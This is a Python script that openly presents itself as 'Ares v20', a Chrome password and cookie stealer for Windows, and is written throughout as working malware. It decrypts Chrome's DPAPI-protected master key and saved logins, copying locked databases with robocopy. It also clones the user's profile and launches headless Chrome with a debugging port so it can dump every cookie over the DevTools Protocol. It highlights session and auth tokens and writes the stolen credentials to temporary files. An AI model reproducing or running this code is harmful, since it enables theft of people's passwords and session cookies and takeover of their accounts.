"""
Ares v20 — Chrome CDP Password & Cookie Stealer
Uses Chrome DevTools Protocol to extract data from running Chrome.
Strategy: Launch a new Chrome with --remote-debugging-port pointing to
a CLONED profile (to avoid lock conflicts).
"""
import json
import os
import shutil
import subprocess
import time
import sqlite3
import base64
import ctypes
import ctypes.wintypes as wt
import tempfile
import websocket
import requests

class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', wt.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

def dpapi_decrypt(data):
    inp = DATA_BLOB()
    inp.pbData = (ctypes.c_byte * len(data)).from_buffer_copy(data)
    inp.cbData = len(data)
    out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(inp), None, None, None, None, 0, ctypes.byref(out)):
        result = bytes((ctypes.c_byte * out.cbData).from_address(
            ctypes.addressof(out.pbData.contents)))
        ctypes.windll.kernel32.LocalFree(out.pbData)
        return result
    return None

def get_v10_key():
    """Get the v10 DPAPI encryption key"""
    la = os.environ['LOCALAPPDATA']
    ls_path = os.path.join(la, 'Google', 'Chrome', 'User Data', 'Local State')
    with open(ls_path, 'r', encoding='utf-8') as f:
        j = json.load(f)
    enc_key = j['os_crypt']['encrypted_key']
    raw = base64.b64decode(enc_key)
    return dpapi_decrypt(raw[5:])  # Skip 'DPAPI'

def aes_decrypt(key, nonce, ciphertext):
    """AES-256-GCM decrypt using Windows BCrypt"""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    aes = AESGCM(key)
    try:
        return aes.decrypt(nonce, ciphertext, None)
    except Exception:
        return None

def steal_via_cdp(port=9222):
    """Connect to Chrome CDP and extract cookies"""
    try:
        resp = requests.get(f'http://127.0.0.1:{port}/json', timeout=3)
        targets = resp.json()
        print(f'[+] Found {len(targets)} CDP targets')
        
        # Find a page target
        page_target = None
        for t in targets:
            if t.get('type') == 'page':
                page_target = t
                break
        if not page_target:
            page_target = targets[0]
        
        ws_url = page_target['webSocketDebuggerUrl']
        print(f'[+] Connecting to: {ws_url}')
        
        # Use no origin or matching origin to bypass CORS check
        ws = websocket.create_connection(
            ws_url, timeout=10,
            suppress_origin=True)
        
        # Get ALL cookies
        ws.send(json.dumps({
            'id': 1,
            'method': 'Network.getAllCookies'
        }))
        result = json.loads(ws.recv())
        cookies = result.get('result', {}).get('cookies', [])
        print(f'[+] Got {len(cookies)} cookies!')
        
        # Save cookies
        out_path = os.path.join(tempfile.gettempdir(), 'ares_cookies.json')
        with open(out_path, 'w') as f:
            json.dump(cookies, f, indent=2)
        print(f'[+] Cookies saved to {out_path}')
        
        # Print interesting cookies
        for c in cookies:
            if any(k in c.get('name', '').lower() for k in ['session', 'token', 'auth', 'sid']):
                print(f'  [KEY] {c["domain"]} | {c["name"]} = {c["value"][:40]}...')
        
        ws.close()
        return cookies
    except Exception as e:
        print(f'[-] CDP failed: {e}')
        return None

def steal_login_data_v10():
    """Decrypt v10 passwords using DPAPI key"""
    key = get_v10_key()
    if not key:
        print('[-] Could not get v10 key')
        return []
    print(f'[+] v10 key: {key.hex()[:16]}...')
    
    la = os.environ['LOCALAPPDATA']
    db_path = os.path.join(la, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    
    # Copy database
    tmp = os.path.join(tempfile.gettempdir(), 'ares_login.db')
    try:
        shutil.copy2(db_path, tmp)
    except OSError:
        # Use robocopy for locked files
        src_dir = os.path.dirname(db_path)
        tmp_dir = os.path.join(tempfile.gettempdir(), 'ares_db_tmp')
        os.makedirs(tmp_dir, exist_ok=True)
        subprocess.run(f'robocopy "{src_dir}" "{tmp_dir}" "Login Data" /R:0 /W:0',
            shell=True, capture_output=True)
        tmp = os.path.join(tmp_dir, 'Login Data')
    
    conn = sqlite3.connect(tmp)
    rows = conn.execute(
        'SELECT origin_url, username_value, password_value FROM logins'
    ).fetchall()
    conn.close()
    
    results = []
    for url, user, pwd in rows:
        if not pwd or not user:
            continue
        if pwd[:3] == b'v10':
            nonce = pwd[3:15]
            ct = pwd[15:]
            pt = aes_decrypt(key, nonce, ct)
            if pt:
                results.append((url, user, pt.decode('utf-8', errors='replace')))
                print(f'  [v10] {url} | {user} | {pt.decode("utf-8", errors="replace")}')
        elif pwd[:3] == b'v20':
            results.append((url, user, '[v20 encrypted]'))
    
    print(f'\n[*] Total: {len(results)} credentials ({sum(1 for r in results if r[2] != "[v20 encrypted]")} decrypted)')
    return results

def main():
    print('[*] Ares v20 — Chrome Data Stealer\n')
    
    # Phase 1: Try v10 decryption
    print('=== Phase 1: v10 Password Decryption ===')
    creds = steal_login_data_v10()
    
    # Phase 2: Launch Chrome with CDP for cookies
    print('\n=== Phase 2: CDP Cookie Extraction ===')
    
    # Check if Chrome already has debugging port
    try:
        resp = requests.get('http://127.0.0.1:9222/json', timeout=2)
        print('[+] Chrome already has debugging port open!')
        cookies = steal_via_cdp(9222)
    except:
        print('[*] No existing debug port, launching new instance...')
        
        # Create temp profile by copying essentials
        la = os.environ['LOCALAPPDATA']
        real_profile = os.path.join(la, 'Google', 'Chrome', 'User Data')
        tmp_profile = os.path.join(tempfile.gettempdir(), 'ares_cdp_profile')
        
        # Clean old
        if os.path.exists(tmp_profile):
            shutil.rmtree(tmp_profile, ignore_errors=True)
        os.makedirs(tmp_profile, exist_ok=True)
        
        # Copy only essential files
        for f in ['Local State']:
            src = os.path.join(real_profile, f)
            if os.path.exists(src):
                shutil.copy2(src, os.path.join(tmp_profile, f))
        
        # Copy Default profile files
        def_dir = os.path.join(tmp_profile, 'Default')
        net_dir = os.path.join(def_dir, 'Network')
        os.makedirs(net_dir, exist_ok=True)
        
        for f in ['Login Data', 'Login Data-journal', 'Preferences', 'Secure Preferences']:
            src = os.path.join(real_profile, 'Default', f)
            if os.path.exists(src):
                try:
                    shutil.copy2(src, os.path.join(def_dir, f))
                except:
                    subprocess.run(
                        f'robocopy "{os.path.dirname(src)}" "{def_dir}" "{os.path.basename(f)}" /R:0 /W:0',
                        shell=True, capture_output=True)
        
        for f in ['Cookies', 'Cookies-journal']:
            src = os.path.join(real_profile, 'Default', 'Network', f)
            if os.path.exists(src):
                try:
                    shutil.copy2(src, os.path.join(net_dir, f))
                except:
                    subprocess.run(
                        f'robocopy "{os.path.dirname(src)}" "{net_dir}" "{os.path.basename(f)}" /R:0 /W:0',
                        shell=True, capture_output=True)
        
        # Remove SingletonLock
        for lock in ['SingletonLock', 'SingletonCookie', 'SingletonSocket']:
            p = os.path.join(tmp_profile, lock)
            try:
                os.remove(p)
            except:
                pass
        
        port = 19222
        chrome_exe = r'C:\Program Files\Google\Chrome\Application\chrome.exe'
        cmd = [
            chrome_exe,
            f'--remote-debugging-port={port}',
            f'--user-data-dir={tmp_profile}',
            '--no-first-run',
            '--no-default-browser-check',
            '--disable-background-networking',
            '--headless=new',
        ]
        
        print(f'[*] Launching Chrome headless on port {port}...')
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(4)
        
        if proc.poll() is not None:
            print(f'[-] Chrome exited: {proc.returncode}')
            print(f'    stderr: {proc.stderr.read().decode()[:200]}')
        else:
            cookies = steal_via_cdp(port)
            proc.terminate()
            proc.wait(timeout=5)
    
    # Phase 3: Save all results
    out_path = os.path.join(tempfile.gettempdir(), 'ares_results.json')
    results = {
        'credentials': [(u, n, p) for u, n, p in creds],
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    with open(out_path, 'w') as f:
        json.dump(results, f, indent=2)
    print(f'\n[+] Results saved to {out_path}')

if __name__ == '__main__':
    main()
